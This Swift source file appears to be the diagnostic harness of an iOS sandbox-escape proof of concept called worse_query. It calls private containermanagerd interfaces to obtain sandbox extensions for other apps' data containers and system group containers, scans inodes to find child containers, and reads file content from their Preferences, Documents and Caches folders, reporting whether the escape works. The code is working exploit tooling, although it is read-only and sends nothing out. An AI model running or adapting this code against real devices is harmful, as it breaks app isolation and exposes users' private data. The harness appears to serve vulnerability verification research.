//
//  Diagnostics.swift
//  Staged, read-only verification of worse_query.
//
//  Produces a structured report so the UI can show a verdict, a stage
//  checklist and per-path cards instead of a raw log.
//

import Foundation

enum Diagnostics {

    enum Status { case pass, fail, warn, info, skip }
    enum Verdict { case pass, partial, fail, untestable }

    struct Stage {
        let title: String
        let status: Status
        let detail: String
    }

    struct ChildResult {
        let name: String
        let containerID: String
        let metadataID: String
        let readBytes: Int
        let metadataRead: Bool
        let idRead: Bool
        let access: Bool
        let error: String
    }

    struct TargetResult {
        let label: String
        let path: String
        let exists: Bool
        let preListable: Bool
        let preErrno: Int32
        let handle: Int64
        let postListable: Bool
        let postErrno: Int32
        let entryCount: Int
        let children: [ChildResult]
        let scanChildren: Int

        /// Strict: real file content from Preferences/Documents/Caches/tmp,
        /// or the container metadata plist. The id xattr alone does not count.
        var fileReads: Int {
            children.filter { $0.readBytes > 0 || $0.metadataRead }.count
        }

        /// Extension worked and the id xattr was read, but no file content.
        var idOnlyReads: Int {
            children.filter { $0.idRead && $0.readBytes == 0 && !$0.metadataRead }.count
        }

        /// Hide tokens that produced neither container metadata nor a file.
        /// Extension failures stay visible; those are real diagnostics.
        var displayChildren: [ChildResult] {
            children.filter {
                !$0.access || $0.idRead || $0.metadataRead || $0.readBytes > 0
            }
        }

        var status: Status {
            if fileReads > 0 { return .pass }
            if handle >= 0 && postListable { return .warn }
            if scanChildren > 0 { return .warn }
            if handle >= 0 { return .warn }
            if !exists && handle == -255 { return .skip }
            return .fail
        }

        var summaryLine: String {
            if scanChildren > 0 {
                return "父路径 \(handle) · 扫描 \(scanChildren) 个子容器 · 文件 \(fileReads) · id \(idOnlyReads)"
            }
            var parts: [String] = ["handle \(handle)"]
            parts.append(preListable ? "消费前可读" : "消费前 EPERM")
            if handle >= 0 {
                parts.append(postListable ? "消费后 \(entryCount) 项" : "消费后拒绝")
            }
            if fileReads > 0 { parts.append("文件 \(fileReads)") }
            if idOnlyReads > 0 { parts.append("id \(idOnlyReads)") }
            return parts.joined(separator: " · ")
        }
    }

    struct Report {
        let verdict: Verdict
        let headline: String
        let subheadline: String
        let iosVersion: String
        let device: String
        let stages: [Stage]
        let targets: [TargetResult]
        let handles: Int
        let listings: Int
        let deepReads: Int
        let idReads: Int
        let preDenied: Int
        let symbolReport: String
        let groupIdentifier: String
        let groupPath: String
        let rawLog: String
    }

    struct Target {
        let label: String
        let path: String
        let deep: Bool
        let scanFallback: Bool
        let knownChildren: [String]
    }

    private static let systemGroupNames: [String] = [
        "systemgroup.com.apple.configurationprofiles",
        "systemgroup.com.apple.mobilegestaltcache",
        "systemgroup.com.apple.osanalytics",
        "systemgroup.com.apple.lsd.iconscache",
        "systemgroup.com.apple.lsd.identifiers",
        "systemgroup.com.apple.ManagedSettings",
        "systemgroup.com.apple.sharedpclogging",
        "systemgroup.com.apple.media.shared.books",
        "systemgroup.com.apple.nsurlstoragedresources",
        "systemgroup.com.apple.pisco.suinfo",
        "systemgroup.com.apple.icloud.findmydevice.managed",
        "systemgroup.com.apple.mobilestoragemounter",
        "systemgroup.com.apple.mobileactivationd",
        "systemgroup.com.apple.sensorkit",
        "systemgroup.com.apple.powerlog",
        "systemgroup.com.apple.diagnosticextensionsd",
        "systemgroup.com.apple.mediaanalysisd",
        "systemgroup.com.apple.translationd",
        "systemgroup.com.apple.chronod",
        "systemgroup.com.apple.coreaudio",
        "systemgroup.com.apple.ManagedConfiguration.ExternalTrust",
        "systemgroup.com.apple.cfprefsd"
    ]

    private static let targets: [Target] = [
        Target(label: "AppGroup 根目录",
               path: "/private/var/mobile/Containers/Shared/AppGroup",
               deep: true, scanFallback: false, knownChildren: []),
        Target(label: "App 数据容器",
               path: "/private/var/mobile/Containers/Data/Application",
               deep: true, scanFallback: true, knownChildren: []),
        Target(label: "InternalDaemon 容器",
               path: "/private/var/mobile/Containers/Data/InternalDaemon",
               deep: true, scanFallback: true, knownChildren: []),
        Target(label: "PluginKitPlugin 容器",
               path: "/private/var/mobile/Containers/Data/PluginKitPlugin",
               deep: true, scanFallback: true, knownChildren: []),
        Target(label: "SystemGroup (iOS 27)",
               path: "/private/var/containers/Shared/SystemGroup",
               deep: true, scanFallback: false, knownChildren: systemGroupNames),
        Target(label: "System 数据 (iOS 27)",
               path: "/private/var/containers/Data/System",
               deep: false, scanFallback: false, knownChildren: [])
    ]

    static func run(group: String) -> Report {
        var raw: [String] = []
        let emit: (String) -> Void = { raw.append($0) }

        let v = ProcessInfo.processInfo.operatingSystemVersion
        let version = "\(v.majorVersion).\(v.minorVersion).\(v.patchVersion)"
        let device = deviceModel()

        emit("worse_query verification harness")
        emit("iOS \(version) | \(device)")
        emit("")

        var stages: [Stage] = []

        // MARK: Stage 1 - App Group entitlement
        emit("== Stage 1: App Group entitlement ==")
        let fm = FileManager.default

        // The signer injects the real group. Never trust a hardcoded ID:
        // AltStore / SideStore / Sideloadly create their own group, and an
        // enterprise profile carries whatever group was registered with it.
        let configuredGroup = group
        let entitledGroups = (wq_entitled_app_groups() as? [String]) ?? []
        let discoveredGroup = wq_own_app_group()
        let effectiveGroup = discoveredGroup ?? configuredGroup

        let entitledText = entitledGroups.isEmpty
            ? "(none)"
            : entitledGroups.joined(separator: ", ")

        emit("    configured: \(configuredGroup.isEmpty ? "(empty)" : configuredGroup)")
        emit("    signature:  \(entitledText)")
        emit("    effective:  \(effectiveGroup.isEmpty ? "(none)" : effectiveGroup)")

        var groupPath = ""
        var groupOK = false

        if !effectiveGroup.isEmpty,
           let url = fm.containerURL(forSecurityApplicationGroupIdentifier: effectiveGroup) {
            groupOK = true
            groupPath = url.path
            emit("[PASS] group container: \(url.path)")
            stages.append(Stage(title: "App Group entitlement",
                                status: .pass,
                                detail: "使用签名注入的 group：\(effectiveGroup)"))
            try? fm.createDirectory(at: url.appendingPathComponent("Library"),
                                    withIntermediateDirectories: true)
        } else {
            let detail: String
            if entitledGroups.isEmpty {
                detail = "签名里没有 application-groups entitlement；换一个会注入 App Group 的签名工具（AltStore/SideStore/Sideloadly），或用带 App Group 的显式 profile"
            } else {
                detail = "签名里有 [\(entitledText)]，但没有可用容器；profile 未授权这个 group"
            }
            emit("[FAIL] \(detail)")
            stages.append(Stage(title: "App Group entitlement",
                                status: .fail,
                                detail: detail))
        }
        emit("")

        guard groupOK else {
            return Report(verdict: .untestable,
                          headline: "无法验证",
                          subheadline: "App Group entitlement 没生效，PoC 连入口都没有",
                          iosVersion: version,
                          device: device,
                          stages: stages,
                          targets: [],
                          handles: 0,
                          listings: 0,
                          deepReads: 0,
                          idReads: 0,
                          preDenied: 0,
                          symbolReport: "not checked",
                          groupIdentifier: effectiveGroup,
                          groupPath: "",
                          rawLog: raw.joined(separator: "\n"))
        }

        // MARK: Stage 2 - private symbols
        emit("== Stage 2: private containermanagerd symbols ==")
        let symbolReport: String = wq_diag_symbol_report() ?? "FAIL: nil"
        let symbolsOK = symbolReport.hasPrefix("OK")
        emit(symbolsOK ? "[PASS] \(symbolReport)" : "[FAIL] \(symbolReport)")
        stages.append(Stage(title: "containermanagerd 私有符号",
                            status: symbolsOK ? .pass : .fail,
                            detail: symbolReport))
        emit("")

        guard symbolsOK else {
            return Report(verdict: .fail,
                          headline: "无法调用私有接口",
                          subheadline: "containermanagerd 的符号缺失，系统可能改了实现",
                          iosVersion: version,
                          device: device,
                          stages: stages,
                          targets: [],
                          handles: 0,
                          listings: 0,
                          deepReads: 0,
                          idReads: 0,
                          preDenied: 0,
                          symbolReport: symbolReport,
                          groupIdentifier: effectiveGroup,
                          groupPath: groupPath,
                          rawLog: raw.joined(separator: "\n"))
        }

        // MARK: Stage 3 - per-target escape
        emit("== Stage 3: sandbox extension per target ==")
        var results: [TargetResult] = []
        var handles = 0
        var listings = 0
        var deepReads = 0
        var preDenied = 0
        var scanTotal = 0
        var idTotal = 0
        var scanCache: [String: [String]]?

        for (i, target) in targets.enumerated() {
            emit("")
            emit("[\(i + 1)/\(targets.count)] \(target.label)")
            emit("    \(target.path)")

            var st = stat()
            let exists = lstat(target.path, &st) == 0
            let lstErr = errno
            let lstText = exists ? "ok" : "fail errno=\(lstErr)"
            emit("    lstat: \(lstText)")

            var preErr: Int32 = 0
            let pre = wq_listdir(target.path, &preErr, 8)
            let preListable = pre != nil
            if !preListable && (preErr == EPERM || preErr == EACCES) { preDenied += 1 }
            let preText = preListable ? "listable (\(pre?.count ?? 0)+)" : "denied errno=\(preErr)"
            emit("    before: \(preText)")

            var handle = worse_query(target.path, effectiveGroup, false, false)
            emit("    worse_query(false,false) -> \(handle) \(code(handle))")

            if handle == -255 {
                handle = worse_query(target.path, effectiveGroup, false, true)
                emit("    worse_query(false,true)  -> \(handle) \(code(handle))")
            }
            if handle < 0 {
                let alt = worse_query(target.path, effectiveGroup, true, false)
                emit("    worse_query(true,false)  -> \(alt) \(code(alt))")
                if alt >= 0 { handle = alt }
            }

            var post: [String]?
            var postErr: Int32 = 0
            var children: [ChildResult] = []
            var scanChildren = 0

            if handle >= 0 {
                handles += 1
                post = wq_listdir(target.path, &postErr, 16)
                if let post = post {
                    emit("    [PASS] after: listable, \(post.count) entries")
                    emit("    sample: \(post.prefix(8).joined(separator: ", "))")
                } else {
                    emit("    [WARN] after: denied errno=\(postErr)")
                }

                if target.deep, let post = post {
                    let probe = deepProbe(root: target.path,
                                          children: Array(post.prefix(2)),
                                          group: effectiveGroup,
                                          emit: emit)
                    deepReads += probe.reads
                    children = probe.children
                }

                worse_query_release(handle)
                emit("    released \(handle)")
            } else {
                emit("    [FAIL] parent extension \(handle) \(code(handle))")

                var scannedPaths: [String] = []

                // On iOS 27.0.1 the four container parents refuse the token.
                // Find their direct children through fsgetpath instead, then
                // consume a per-container extension like WQFiles does.
                if target.scanFallback {
                    if scanCache == nil {
                        let baseline = wq_baseline_inode()
                        let maxInode = baseline > 0 ? baseline + 100_000 : 0
                        let parents = targets.filter { $0.scanFallback }.map { $0.path }
                        emit("    fsgetpath scan: baseline \(baseline), max \(maxInode), 30s budget, \(parents.count) parents")
                        if maxInode > 0 {
                            scanCache = (wq_scan_children(parents, maxInode, 8, 30.0)
                                         as? [String: [String]]) ?? [:]
                        } else {
                            scanCache = [:]
                        }
                    }

                    scannedPaths = scanCache?[target.path] ?? []
                    emit("    fsgetpath: \(scannedPaths.count) child path(s)")
                }

                var probe = probeScanned(paths: scannedPaths,
                                         group: effectiveGroup,
                                         emit: emit)
                var knownCount = 0

                // SystemGroup children are known names, not discoverable by scan.
                if !target.knownChildren.isEmpty {
                    let known = probeKnown(parent: target.path,
                                           names: target.knownChildren,
                                           group: effectiveGroup,
                                           emit: emit)
                    probe.results.append(contentsOf: known.results)
                    probe.reads += known.reads
                    knownCount = known.children
                    emit("    known names: \(knownCount) reachable")
                }

                scanChildren = scannedPaths.count + knownCount
                children = probe.results
                deepReads += probe.reads
                scanTotal += scanChildren
            }

            idTotal += children.filter {
                $0.idRead && $0.readBytes == 0 && !$0.metadataRead
            }.count

            if post != nil { listings += 1 }

            results.append(TargetResult(label: target.label,
                                        path: target.path,
                                        exists: exists,
                                        preListable: preListable,
                                        preErrno: preErr,
                                        handle: handle,
                                        postListable: post != nil,
                                        postErrno: postErr,
                                        entryCount: post?.count ?? 0,
                                        children: children,
                                        scanChildren: scanChildren))
        }

        // MARK: Stage 3/4 summary
        let stage3Status: Status
        if (handles > 0 && listings > 0) || scanTotal > 0 {
            stage3Status = .pass
        } else if handles > 0 {
            stage3Status = .warn
        } else {
            stage3Status = .fail
        }
        stages.append(Stage(title: "目标路径逃逸",
                            status: stage3Status,
                            detail: "\(handles)/\(targets.count) 个父路径拿到 extension，\(listings) 个目录可读，扫描补充 \(scanTotal) 个子容器"))

        let stage4Status: Status = deepReads > 0 ? .pass : (idTotal > 0 ? .warn : (handles > 0 ? .warn : .skip))
        stages.append(Stage(title: "跨容器真实读取",
                            status: stage4Status,
                            detail: "\(deepReads) 个真实文件读取，\(idTotal) 个仅 id 访问"))

        // MARK: Verdict
        let reachable = results.filter { $0.status == .pass }.count
        let verdict: Verdict
        let headline: String
        let subheadline: String

        if deepReads > 0 {
            verdict = .pass
            headline = "沙盒逃逸生效"
            subheadline = "严格 PASS \(reachable)/\(targets.count)，真实文件读取 \(deepReads)，仅 id \(idTotal)；父级 token \(handles)/\(targets.count)"
        } else if handles > 0 || scanTotal > 0 {
            verdict = .partial
            headline = "逃逸部分生效"
            subheadline = "找到了容器 / 拿到了 id，但没有真实文件读取"
        } else {
            verdict = .fail
            headline = "沙盒逃逸未生效"
            subheadline = "\(targets.count) 个目标全部没拿到 extension；可能已修复或 flags 不对"
        }

        emit("")
        emit("== VERDICT ==")
        emit("\(headline) - \(subheadline)")
        emit("handles \(handles)/\(targets.count), listings \(listings), file reads \(deepReads), id-only \(idTotal), pre-denied \(preDenied)")
        emit("[NOTE] read-only; only writes inside its own App Group")

        return Report(verdict: verdict,
                      headline: headline,
                      subheadline: subheadline,
                      iosVersion: version,
                      device: device,
                      stages: stages,
                      targets: results,
                      handles: handles,
                      listings: listings,
                      deepReads: deepReads,
                      idReads: idTotal,
                      preDenied: preDenied,
                      symbolReport: symbolReport,
                      groupIdentifier: effectiveGroup,
                      groupPath: groupPath,
                      rawLog: raw.joined(separator: "\n"))
    }

    /// Consumes a per-container extension, then tries to read real container data.
    private static func deepProbe(root: String,
                                  children: [String],
                                  group: String,
                                  emit: (String) -> Void) -> (reads: Int, children: [ChildResult]) {
        var reads = 0
        var out: [ChildResult] = []

        for child in children {
            let result = probeContainer(path: root + "/" + child,
                                        name: child,
                                        group: group,
                                        emit: emit)
            if result.readBytes > 0 || result.metadataRead { reads += 1 }
            out.append(result)
        }

        return (reads, out)
    }

    /// Children discovered through fsgetpath: consume each one separately.
    private static func probeScanned(paths: [String],
                                     group: String,
                                     emit: (String) -> Void) -> (reads: Int, results: [ChildResult]) {
        var reads = 0
        var results: [ChildResult] = []

        for path in paths {
            let name = (path as NSString).lastPathComponent
            let result = probeContainer(path: path, name: name, group: group, emit: emit)
            if result.readBytes > 0 || result.metadataRead { reads += 1 }
            results.append(result)
        }

        return (reads, results)
    }

    /// SystemGroup children are not discoverable by fsgetpath reliably; try the
    /// known container names, the same list WQFiles uses.
    private static func probeKnown(parent: String,
                                   names: [String],
                                   group: String,
                                   emit: (String) -> Void) -> (children: Int, reads: Int, results: [ChildResult]) {
        var reads = 0
        var results: [ChildResult] = []

        for name in names {
            let result = probeContainer(path: parent + "/" + name,
                                        name: name,
                                        group: group,
                                        emit: emit)
            // A token can be issued for a non-existent known name; only keep
            // entries that actually produced container metadata or a file.
            guard result.access,
                  result.idRead || result.metadataRead || result.readBytes > 0 else { continue }
            results.append(result)
            if result.readBytes > 0 || result.metadataRead { reads += 1 }
        }

        return (results.count, reads, results)
    }

    private static func probeContainer(path: String,
                                       name: String,
                                       group: String,
                                       emit: (String) -> Void) -> ChildResult {
        let h = worse_query(path, group, false, true)
        if h < 0 {
            emit("      child \(name): extension failed \(h) \(code(h))")
            return ChildResult(name: name, containerID: "?", metadataID: "?",
                               readBytes: 0, metadataRead: false, idRead: false,
                               access: false, error: "ext \(h)")
        }

        let cid = wq_container_id(path) ?? "?"
        let meta = wq_container_metadata(path)
        let mid = (meta?["MCMMetadataIdentifier"] as? String) ?? "?"
        let metadataRead = (meta != nil)
        let idRead = (cid != "?")

        var readBytes = 0
        let locations = ["Library/Preferences", "Documents", "Library/Caches", "tmp"]

        for location in locations {
            var listErr: Int32 = 0
            guard let entries = wq_listdir(path + "/" + location, &listErr, 8),
                  !entries.isEmpty else { continue }

            for entry in entries.prefix(3) {
                var readErr: Int32 = 0
                if let data = wq_readfile(path + "/" + location + "/" + entry,
                                          4096, &readErr) {
                    readBytes = data.count
                    emit("      child \(name): ext=ok id=\(cid) meta=\(mid) read=\(readBytes)B (\(location)/\(entry))")
                    break
                }
            }
            if readBytes > 0 { break }
        }

        var errText = ""
        if readBytes == 0 {
            if idRead || metadataRead {
                emit("      child \(name): ext=ok id=\(cid) meta=\(mid) (metadata only)")
            } else {
                errText = "no readable content"
                emit("      child \(name): ext=ok id=\(cid) meta=\(mid) \(errText)")
            }
        }

        worse_query_release(h)
        return ChildResult(name: name, containerID: cid, metadataID: mid,
                           readBytes: readBytes, metadataRead: metadataRead,
                           idRead: idRead, access: true, error: errText)
    }

    private static func code(_ h: Int64) -> String {
        switch h {
        case -1:   return "(-1: App Group container unavailable)"
        case -2:   return "(-2: dlopen/dlsym failed)"
        case -3:   return "(-3: container_query_create failed)"
        case -4:   return "(-4: symlink creation failed)"
        case -5:   return "(-5: query rejected by containermanagerd)"
        case -6:   return "(-6: kernel refused sandbox token)"
        case -255: return "(-255: target lstat failed)"
        default:   return h >= 0 ? "(valid extension handle)" : "(unknown)"
        }
    }

    private static func deviceModel() -> String {
        var uts = utsname()
        uname(&uts)
        return withUnsafePointer(to: &uts.machine) {
            $0.withMemoryRebound(to: CChar.self, capacity: 1) { String(cString: $0) }
        }
    }
}

extension Diagnostics.Status {
    var text: String {
        switch self {
        case .pass: return "PASS"
        case .fail: return "FAIL"
        case .warn: return "WARN"
        case .info: return "INFO"
        case .skip: return "SKIP"
        }
    }
}

extension Diagnostics.TargetResult {
    var statusWord: String { status.text }
}

extension Diagnostics.Report {
    var scanChildrenTotal: Int {
        targets.reduce(0) { $0 + $1.scanChildren }
    }

    var reachableTargets: Int {
        targets.filter { $0.status == .pass }.count
    }

    var shareText: String {
        var s = "worse_query 验证结论\n"
        s += "\(headline)\n"
        s += "\(subheadline)\n"
        s += "iOS \(iosVersion) | \(device)\n"
        s += "App Group: \(groupIdentifier)\n"
        s += "严格 PASS \(reachableTargets)/\(targets.count) | 文件读取 \(deepReads) | 仅 id \(idReads) | 父级 token \(handles)/\(targets.count) | 目录可读 \(listings) | 扫描子容器 \(scanChildrenTotal)\n\n"

        for t in targets {
            let pre = t.preListable ? "可读" : "EPERM(\(t.preErrno))"
            let post = t.postListable ? "\(t.entryCount)项" : "拒绝(\(t.postErrno))"
            s += "[\(t.statusWord)] \(t.label)\n"
            s += "  \(t.path)\n"
            s += "  handle=\(t.handle) 消费前=\(pre) 消费后=\(post) 文件=\(t.fileReads) 仅id=\(t.idOnlyReads)\n"
            if t.scanChildren > 0 {
                s += "  扫描=\(t.scanChildren) 个子容器 文件=\(t.fileReads) 仅id=\(t.idOnlyReads)\n"
            }
        }

        s += "\n--- 原始日志 ---\n\(rawLog)\n"
        return s
    }
}